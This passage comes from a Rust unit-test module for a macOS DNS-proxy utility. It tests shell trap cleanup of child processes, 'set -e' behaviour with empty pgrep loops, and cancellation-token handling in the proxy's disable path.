    /// pid_file 内容(非数字、空)返回 false —— disable 路径会走 sudo-kill
    /// 兜底,而不是把 broken pid 当活 proxy 用 signal-file 协议。
    #[test]
    fn test_is_expected_proxy_alive_returns_bool() {
        // CI 里没有 proxy,应该返回 false
        let _ = super::is_expected_proxy_alive();
    }

    /// **fix (issue #148 review)**:trap 必须在脚本 EXIT 时真的 kill 子进程。
    /// 这是 issue #148 描述的 root cause 的端到端验证 —— 用户 Cancel
    /// osascript,shell 退出非零,trap 杀掉 proxy。
    ///
    /// 不直接测 build_enable_script_body(里面包了 pgrep + networksetup,
    /// CI 环境跑不动);改测最小化的 trap 模式:`sleep 30 &` + `exit 1` →
    /// 验证 trap 把 sleep 杀掉。
    ///
    /// 强验证(替代旧的 3s hang-only assertion):trap 跑完后通过 `pgrep`
    /// 找以自己 PPID 为父的 sleep 子进程,应该找不到。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_trap_kills_long_sleeping_child() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;
        use std::time::{Duration, Instant};

        // 最小 trap 脚本:启动 sleep 子进程 + exit 1 → trap kill 子进程
        let script_body = r#"#!/bin/sh
set -e
child_pid=""
cleanup() {
    if [ -n "$child_pid" ]; then
        kill -TERM "$child_pid" 2>/dev/null || true
        sleep 1
        kill -KILL "$child_pid" 2>/dev/null || true
    fi
}
trap cleanup EXIT INT TERM

sleep 30 &
child_pid=$!
disown

# 立刻失败,触发 trap
exit 1
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-trap-test-{}-{}.sh",
            std::process::id(),
            1
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().expect("run trap test script");

        assert!(
            !output.status.success(),
            "trap test 脚本应该 exit 1 (失败路径),让 trap 触发"
        );

        // 等最多 2s 让 trap 的 TERM→KILL 序列(1s sleep + 一点缓冲)跑完。
        let deadline = Instant::now() + Duration::from_secs(2);
        let mut sleep_pids_after: Vec<u32> = Vec::new();
        while Instant::now() < deadline {
            // 找以这个测试进程为父的 sleep 30 子进程(trap 脚本 disown 了,
            // 所以 PPID 是 trap test script 而不是测试进程。但 trap 跑完
            // sleep 应该已经被 KILL 掉,任何 ppid 下都不应存在)。
            let pgrep_out = Command::new("pgrep").args(["-f", "sleep 30"]).output();
            if let Ok(out) = pgrep_out {
                let stdout = String::from_utf8_lossy(&out.stdout);
                sleep_pids_after = stdout
                    .lines()
                    .filter_map(|l| l.trim().parse::<u32>().ok())
                    .collect();
                if sleep_pids_after.is_empty() {
                    break;
                }
            }
            std::thread::sleep(Duration::from_millis(50));
        }

        let _ = std::fs::remove_file(&path);

        assert!(
            sleep_pids_after.is_empty(),
            "trap must kill sleep 30 child; found pids still alive: {:?}",
            sleep_pids_after
        );
    }

    /// **fix (issue #148 review)**:`set -e` + `for pid in $(pgrep -x nothing-running)`
    /// 的组合必须不因 pgrep 退出 1 而让整个脚本提前退出 —— 这是 inline
    /// orphan-cleanup 在脚本顶部能用 `set -e` 的关键不变量。Linux dash /
    /// bash 5 的 `set -e` 行为在 command substitution 失败时与 macOS bash 3.2
    /// 不同,值得显式测试。
    ///
    /// 直接用 `sh -c "..."` 跑一段最小 inline-kill 模式,断言:
    /// - pgrep 退出 1 不导致外层脚本退出
    /// - `after-loop` echo 仍然执行
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_no_orphan_does_not_exit_early() {
        use std::process::Command;

        // 1. 用 sh 跑的最小版本(macOS /bin/sh 实际是 bash 3.2)。
        let sh_script = r#"#!/bin/sh
set -e
for pid in $(pgrep -x definitely-not-running-mhost-dns-proxy-xyz); do
    kill -TERM "$pid" 2>/dev/null || true
done
echo "after-loop-marker"
exit 0
"#;
        let sh_path = std::env::temp_dir().join(format!(
            "mhost-dns-no-orphan-sh-{}-{}.sh",
            std::process::id(),
            1
        ));
        let _ = std::fs::remove_file(&sh_path);
        {
            use std::os::unix::fs::OpenOptionsExt;
            std::fs::OpenOptions::new()
                .write(true)
                .create_new(true)
                .mode(0o700)
                .open(&sh_path)
                .unwrap();
        }
        std::fs::write(&sh_path, sh_script).unwrap();
        let sh_out = Command::new(&sh_path).output().expect("run sh test");
        let sh_stdout = String::from_utf8_lossy(&sh_out.stdout).into_owned();
        let _ = std::fs::remove_file(&sh_path);
        assert!(
            sh_out.status.success(),
            "sh script with empty pgrep must succeed; stderr: {}",
            String::from_utf8_lossy(&sh_out.stderr)
        );
        assert!(
            sh_stdout.contains("after-loop-marker"),
            "sh: script must reach echo after empty pgrep loop; stdout: {:?}",
            sh_stdout
        );

        // 2. bash (Linux CI 主流 shell) 也跑一遍同样的脚本。
        if let Ok(bash_path) = std::process::Command::new("which")
            .arg("bash")
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        {
            if !bash_path.is_empty() && std::path::Path::new(&bash_path).exists() {
                let bash_script = sh_script.replace("#!/bin/sh", "#!/usr/bin/env bash");
                let bash_path_file = std::env::temp_dir().join(format!(
                    "mhost-dns-no-orphan-bash-{}-{}.sh",
                    std::process::id(),
                    1
                ));
                let _ = std::fs::remove_file(&bash_path_file);
                std::fs::write(&bash_path_file, &bash_script).unwrap();
                let bash_out = Command::new(&bash_path)
                    .arg(&bash_path_file)
                    .output()
                    .expect("run bash test");
                let bash_stdout = String::from_utf8_lossy(&bash_out.stdout).into_owned();
                let _ = std::fs::remove_file(&bash_path_file);
                assert!(
                    bash_out.status.success(),
                    "bash script with empty pgrep must succeed; stderr: {}",
                    String::from_utf8_lossy(&bash_out.stderr)
                );
                assert!(
                    bash_stdout.contains("after-loop-marker"),
                    "bash: script must reach echo after empty pgrep loop; stdout: {:?}",
                    bash_stdout
                );
            }
        }
    }

    // -----------------------------------------------------------------------
    // Issue #149 — disable_dns_mode cancel-token contract
    //
    // When `Some(cancel)` is passed, the 5s proxy-exit wait loop must bail
    // promptly on cancellation and return Ok(()). Recovery marker stays on
    // disk so next-launch `try_recover_dns` can force-restore.
    //
    // The cancel check only fires inside the `kill(proxy_pid, 0)` alive
    // branch; if no PID file is present, the function short-circuits and
    // returns without consulting the cancel token. That branch is already
    // exercised by the disable-time sudo fallback tests; here we focus on
    // the wait-loop bailing path.
    // -----------------------------------------------------------------------

    /// Pre-cancelled token → `disable_dns_mode` returns `Ok(())` within
    /// the 5s window instead of waiting for the fake proxy to exit.
    ///
    /// Sets up a fake "alive" proxy PID (the test process itself) so the
    /// function enters the wait loop, then pre-cancels and verifies the
    /// loop bails on the first cancel-check tick (~100ms).
    #[test]
    fn test_disable_dns_mode_cancellable_bails_on_pre_cancelled_token() {
        let _guard = serial_runtime_dir_test();
        let _tmp = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", _tmp.path());

        // Write a PID file pointing at the test process itself. `kill(pid, 0)`
        // returns 0 because we can signal ourselves — so disable_dns_mode
        // enters the alive-proxy branch and would normally wait the full 5s.
        std::fs::create_dir_all(runtime_dir()).unwrap();
        std::fs::write(
            proxy_pid_file(),
            format!("{} /test/mhost-dns-proxy\n", std::process::id()),
        )
        .unwrap();

        let cancel = tokio_util::sync::CancellationToken::new();
        cancel.cancel();

        let start = std::time::Instant::now();
        let result = disable_dns_mode(&mhost_core::OriginalDns::DhcpEmpty, true, Some(&cancel));
        let elapsed = start.elapsed();

        assert!(
            result.is_ok(),
            "cancelled disable must return Ok: {:?}",
            result
        );
        assert!(
            elapsed < std::time::Duration::from_secs(2),
            "cancel must bail the 5s wait loop within 2s; took {:?}",
            elapsed
        );

        // Recovery marker must stay on disk so next launch can force-restore
        // (cancel path doesn't get to call osascript sudo because the
        // function bailed before the interactive branch).
        assert!(
            disable_recovery_marker_file().exists(),
            "cancel path must leave recovery marker for next-launch force restore"
        );

        // Cleanup
        let _ = std::fs::remove_file(proxy_pid_file());
        let _ = std::fs::remove_file(disable_recovery_marker_file());
        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// `cancel=None` (rollback / cleanup path) must NOT bail — it must wait
    /// the full 5s for proxy to exit. With a fake alive PID, the loop will
    /// time out, hit the interactive osascript fallback, and return either
    /// Ok (if osascript + networksetup succeed in this runner) or Err
    /// (if sudo isn't available). The point is: cancel=None behaves
    /// exactly as before this PR — the cancel token must be ignored.
    #[test]
    fn test_disable_dns_mode_cancellable_none_does_not_bail() {
        let _guard = serial_runtime_dir_test();
        let _tmp = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", _tmp.path());

        std::fs::create_dir_all(runtime_dir()).unwrap();
        std::fs::write(
            proxy_pid_file(),
            format!("{} /test/mhost-dns-proxy\n", std::process::id()),
        )
        .unwrap();

        // Pre-cancel a token but DON'T pass it to disable_dns_mode.
        let cancel = tokio_util::sync::CancellationToken::new();
        cancel.cancel();

        let start = std::time::Instant::now();
        let _ = disable_dns_mode(
            &mhost_core::OriginalDns::DhcpEmpty,
            true, // interactive=true triggers osascript fallback after timeout
            None, // <-- the contract: no cancel checking
        );
        let elapsed = start.elapsed();

        // The defining assertion: cancel=None must wait the full 5s timeout,
        // proving the cancel token was NOT consulted. The result type
        // depends on whether osascript + networksetup succeed in this
        // runner (Ok on dev machines with sudo, Err in CI without), so we
        // don't assert on it.
        assert!(
            elapsed >= std::time::Duration::from_secs(4),
            "cancel=None must wait full timeout; took {:?}",
            elapsed
        );

        // Cleanup
        let _ = std::fs::remove_file(proxy_pid_file());
        let _ = std::fs::remove_file(disable_recovery_marker_file());
        std::env::remove_var("MHOST_RUNTIME_DIR");
    }
}
